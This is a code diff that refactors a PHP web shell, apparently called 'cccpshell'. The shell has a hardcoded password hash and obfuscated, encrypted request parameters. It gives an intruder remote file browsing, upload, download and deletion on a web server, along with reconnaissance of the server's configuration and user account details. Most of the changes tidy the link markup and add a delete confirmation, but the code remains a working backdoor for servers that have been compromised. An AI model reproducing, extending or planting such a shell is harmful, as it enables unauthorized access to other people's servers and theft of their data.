@@ -13,7 +13,7 @@ $config['datetime'] = 'd/m/Y H:i:s';
 $config['hd_lines'] = 16;   //lines in hex preview file
 $config['hd_rows'] = 32;    //16, 24 or 32 bytes in one line
 $config['FMLimit'] = False; //file manager item limit. False = No limit //TODO
-$config['checkBDel'] = true;//Check Before Delete: True = On //TODO
+$config['checkBDel'] = true;//Check Before Delete: True = On 
 $config['consNames'] = array('post'=>'dsr', 'slogin'=>'cccpshell', 'sqlclog'=>'conlog'); //Constants names
 $config['sPass'] = '775a373fb43d8101818d45c28036df87'; // md5(pass) //cccpshell
 
@@ -71,9 +71,9 @@ function mHide($n, $v){
 	return "<input id='$n' name='$n' type='hidden' value='$v' />";
 }
 
-function mLink($t, $o, $m = true){
+function mLink($t, $o, $e = '', $m = true){
 	if ($m) $o .= ';return false;';
-	return "<a href='#' onclick='$o'>$t</a>";
+	return "<a href='#' onclick='$o' $e>$t</a>";
 }
 
 function mInput($arg){
@@ -850,7 +850,8 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 				dragDeltaX = e.pageX - parseInt(o.left);
 				dragDeltaY = e.pageY - parseInt(o.top);
 				drag_start();
-			} else drag_stop();
+			} else
+				drag_stop();
 		}, false);
 
 		//if ($(\'.box input\')[0]) $(\'.box input\')[0].focus();
@@ -956,6 +957,13 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 	}
 	
 	function processUI(a, o, n){
+		' . ($config['checkBDel'] ? '
+		if (a === "del" || a === "rdel")
+			if (!confirm(\'' . tText('merror', 'Are you sure?') . '\')) {
+				hide_box();
+				return;
+			}
+		' : '') . '
         if (a === "comp"){
             hide_box();
             append("content", "<iframe id=\'dlf\' class=\'hide\' src=\'" + targeturl + "?' . $config['consNames']['post'] . '=" + getCrypt("me=file&md=tools&ac=comp&" + o , "e") + "\'></iframe>");
@@ -1475,12 +1483,10 @@ if (isset($p['me']) && $p['me'] === 'file'){
     function getUser($filepath){
 		if (function_exists('posix_getpwuid')){
 			$array = @posix_getpwuid(@fileowner($filepath));
-			if ($array && is_array($array)){
-				return ' / <a href="#" onclick="return false;" title="User: ' . $array['name'] . ' Passwd: ' . $array['passwd']
-					. ' UID: ' . $array['uid'] . '	GID: ' . $array['gid']
-					. ' Gecos: ' . $array['gecos'] . '	Dir: ' . $array['dir']
-					. ' Shell: ' . $array['shell'] . '">' . $array['name'] . '</a>';
-			}
+			if ($array && is_array($array))
+				return ' / ' . mLink($array['name'], 'return false;', "title='User: {$array['name']} Passwd: {$array['passwd']} " .
+					"UID: {$array['uid']}	GID: {$array['gid']} Gecos: {$array['gecos']} Dir: {$array['dir']} " .
+					"Shell: {$array['shell']}", false);
 		}
 		return '';
     }
@@ -1930,11 +1936,11 @@ if (isset($p['me']) && $p['me'] === 'file'){
         if ($free) $sBuff .= '<h2>' . tText('freespace', 'Free space') . ' ' . sizecount($free) . ' ' . tText('of', 'of') . ' ' . sizecount($all) . ' (' . round(100 / ($all / $free), 2) . '%)</h2>';
 		
 		$fp = '';
-		$lnks = '';
+		$lnks = '';	
 		foreach (explode(DS, $currentdir) as $tmp){
 			if (!empty($tmp) || empty($fp)){
 				$fp .= $tmp . DS;
-				$lnks .= '<a href="#" data-path="' . $fp .'" onclick="godisk(this);return false;" >' . $tmp . DS . '</a> ';
+				$lnks .= mLink($tmp . DS, 'godisk(this)', "data-path='$fp'") . ' ';
 			}
 		}
 		unset($fp, $tmp);
@@ -1970,22 +1976,20 @@ if (isset($p['me']) && $p['me'] === 'file'){
 					}
 				}
             } else {
-				foreach (range('A', 'Z') as $letter){
-					if (@is_readable($letter . ':\\')) $sBuff .= ' [<a href="#" data-path="' . $letter . ':\\" onclick="godisk(this);return false;" >' . $letter . ':</a>] ';
-				}
+				foreach (range('A', 'Z') as $letter)
+					if (@is_readable($letter . ':\\')) 
+						$sBuff .= ' [' . mLink("$letter:", 'godisk(this)', "data-path='$letter:\\'") . '] ';
 			}
 			$sBuff .= '<br>';
         }
 
-        $sBuff .= '
-		<a href="#" data-path="' .$_SERVER['DOCUMENT_ROOT'] . '" onclick="godisk(this, false);return false;">' . tText('webroot', 'WebRoot') . '</a> | 
-		<!-- <a href="#" onclick="ajaxLoad(\'dir=' . $shelldir . '/&view_writable=dir\');">' . tText('vwdir', 'View writable directories') . '</a> | 
-		<a href="#" onclick="ajaxLoad(\'dir=' . $shelldir . '/&view_writable=file\');">' . tText('vwfils', 'View writable files') . '</a> | -->
-		<a href="#" onclick="showUI(\'cdir\', this);return false;">' . tText('createdir', 'Create directory') . '</a> | 
-		<a href="#" onclick="showUI(\'cfile\', this);return false;">' . tText('createfile', 'Create file') . '</a> | 
-		<a href="#" onclick="up();return false;">' . tText('upload', 'Upload') . '</a>
-		</td></tr></table>
-		<br>';
+		//TODO
+		/*<!-- <a href="#" onclick="ajaxLoad(\'dir=' . $shelldir . '/&view_writable=dir\');">' . tText('vwdir', 'View writable directories') . '</a> | 
+		<a href="#" onclick="ajaxLoad(\'dir=' . $shelldir . '/&view_writable=file\');">' . tText('vwfils', 'View writable files') . '</a> | -->*/
+		$sBuff .= mLink(tText('webroot', 'WebRoot'), 'godisk(this, false)', "data-path='{$_SERVER['DOCUMENT_ROOT']}'") . ' | ' .
+			mLink(tText('createdir', 'Create directory'), 'showUI("cdir", this)') . ' | ' .
+			mLink(tText('createfile', 'Create file'), 'showUI("cfile", this)') . ' | ' .
+			mLink(tText('upload', 'Upload'), 'up()') . '</td></tr></table><br>';
 
         $dirdata = $filedata = array();
 		
@@ -2038,7 +2042,7 @@ if (isset($p['me']) && $p['me'] === 'file'){
 		
 		$sBuff .= '<table id="sort" class="explore sortable">
 			<thead><tr data-path="' . getUpPath($currentdir) . '" class="alt1">
-			<td class="alt1 sorttable_nosort"><a href="#" onclick="godir(this, false);return false;"><div class="image lnk"></div></a></td>
+			<td class="alt1 sorttable_nosort">' . mLink('<div class="image lnk"></div>', 'godir(this, false)') . '</td>
 			<td width="70%"><b>' . tText('name', 'Name') . '</b></td>
 			<td><b>' . tText('date', 'Date') . '</b></td>
 			<td><b>' . tText('size', 'Size') . '</b></td>
@@ -2096,10 +2100,8 @@ if (isset($p['me']) && $p['me'] === 'file'){
 					<input name="chkall" value="" type="checkbox" onclick="CheckAll(this.form);" />
 					</td>
 					<td>
-					' . tText('selected', 'Selected')  . ': 
-					<a href="#" onclick="showUISec(\'comp\', this);return false;">' . tText('download', 'Download')  . '</a> | 
-					<a href="#" onclick="showUISec(\'rdel\', this);return false;">' . tText('del', 'Del') . '</a> | 
-					<a href="#" onclick="showUISec(\'copy\', this);return false;">' . tText('copy', 'Copy') . '</a>
+					' . tText('selected', 'Selected')  . ': ' . mLink(tText('download', 'Download'), 'showUISec("comp", this)') . ' | ' . 
+					mLink(tText('del', 'Del'), 'showUISec("rdel", this)') . ' | ' . mLink(tText('copy', 'Copy'), 'showUISec("copy", this)') . '
 					</td>
 					<td colspan="4" align="right">
 					<b>' . $d . '</b> ' . tText('dirs', 'Directories')  . ' / <b>' . ($c - $d) . '</b> ' . tText('fils', 'Files') . '
@@ -2107,14 +2109,6 @@ if (isset($p['me']) && $p['me'] === 'file'){
 					</tr></tfoot>
 					</table></form>' . mHide('base', $currentdir);
         }
-}
-
-if (isset($p['me']) && $p['me'] === 'phpinfo'){
-    if (function_exists('phpinfo') && @!in_array('phpinfo', $dis_func)){
-        phpinfo();
-        exit;
-    } else
-        $sBuff = sDialog(tText('phpinfoerror', 'phpinfo() function has non-permissible'));
 }
 
 if (isset($p['me']) && $p['me'] === 'srm'){
@@ -2637,7 +2631,7 @@ if (isset($p['me']) && $p['me'] === 'info'){
         'PHP run mode' => php_sapi_name(),
         'This file path' => __file__,
         'PHP Version' => PHP_VERSION,
-        'PHP Info' => ((function_exists('phpinfo') && @! in_array('phpinfo', $dis_func)) ? '<a href="#" onclick="ajaxLoad(\'me=phpinfo\')">Yes</a>' : 'No'),
+        'PHP Info' => ((function_exists('phpinfo') && @! in_array('phpinfo', $dis_func)) ? '<b>Yes</b>' : 'No'),
         'Safe Mode' => getcfg('safe_mode'),
         'Administrator' => (isset($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : getcfg('sendmail_from')),
         'allow_url_fopen' => getcfg('allow_url_fopen'),
@@ -2766,13 +2760,15 @@ if (isset($p['me']) && $p['me'] === 'info'){
 			$i_buff = preg_replace("/\ +/", " ", $i_buff);
 			$i_buffs = explode("\n\n", $i_buff);
 			$i_head = explode(" ", $i_buffs[0]);
-			foreach($i_head as $h) $sBuff .= "<th>$h</th>";
+			foreach($i_head as $h) 
+				$sBuff .= "<th>$h</th>";
 			$sBuff .= "</tr>";
 			$i_buffss = explode("\n", $i_buffs[1]);
 			foreach($i_buffss as $i_b){
 				$i_row = explode(" ", trim($i_b));
 				$sBuff .= "<tr>";
-				foreach($i_row as $r) $sBuff .= "<td style='text-align:center;'>".$r."</td>";
+				foreach($i_row as $r) 
+					$sBuff .= "<td style='text-align:center;'>".$r."</td>";
 				$sBuff .= "</tr>";
 			}
 			$sBuff .= "</table></div>";
@@ -2783,17 +2779,16 @@ if (isset($p['me']) && $p['me'] === 'info'){
 	foreach($phpinfo as $p=>$i){
 		$sBuff .= "<p class='boxtitle' onclick=\"toggle('".$i."');\" style='margin-bottom:8px;'>".$p."</p>";
 		ob_start();
-		eval("phpinfo(".$i.");");
+		eval("phpinfo($i);");
 		$b = ob_get_contents();
 		ob_end_clean();
-		if(preg_match("/<body>(.*?)<\/body>/is", $b, $r)){
-		$body = str_replace(array(",", ";", "&amp;"), array(", ", "; ", "&"), $r[1]);
-		$body = str_replace("<table", "<table class='boxtbl' ", $body);
-		$body = preg_replace("/<tr class=\"h\">(.*?)<\/tr>/", "", $body);
-		$body = preg_replace("/<a href=\"http:\/\/www.php.net\/(.*?)<\/a>/", "", $body);
-		$body = preg_replace("/<a href=\"http:\/\/www.zend.com\/(.*?)<\/a>/", "", $body);
-
-		$sBuff .= "<div class='info' id='".$i."' style='margin-bottom:8px;display:none;'>".$body."</div>";
+		if (preg_match("/<body>(.*?)<\/body>/is", $b, $r)){
+			$body = str_replace(array(',', ';', '&amp;'), array(', ', '; ', '&'), $r[1]);
+			$body = str_replace('<table', "<table class='boxtbl' ", $body);
+			$body = preg_replace("/<tr class=\"h\">(.*?)<\/tr>/", "", $body);
+			$body = preg_replace("/<a href=\"http:\/\/www.php.net\/(.*?)<\/a>/", '', $body);
+			$body = preg_replace("/<a href=\"http:\/\/www.zend.com\/(.*?)<\/a>/", '', $body);
+			$sBuff .= "<div class='info' id='$i' style='margin-bottom:8px;display:none;'>$body</div>";
 		}
 	}
 }
